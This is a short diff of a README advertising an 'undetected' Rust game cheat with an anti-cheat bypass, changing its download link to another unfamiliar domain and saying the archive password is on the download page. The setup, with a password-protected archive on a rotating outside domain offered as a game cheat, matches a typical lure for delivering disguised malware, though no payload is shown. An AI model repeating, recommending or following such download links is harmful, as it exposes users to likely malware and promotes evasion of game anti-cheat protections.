@@ -18,7 +18,7 @@ Rust Hack - undetected cheat tool. Anti-cheat bypass included. Works with the la
 
 ## Download
 
-[![Download v3.0.0](https://img.shields.io/badge/Download_v3.0.0-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/rusthack)
+[![Download v3.0.0](https://img.shields.io/badge/Download_v3.0.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/rusthack)
 
 > The archive password is shown on the download page.
 
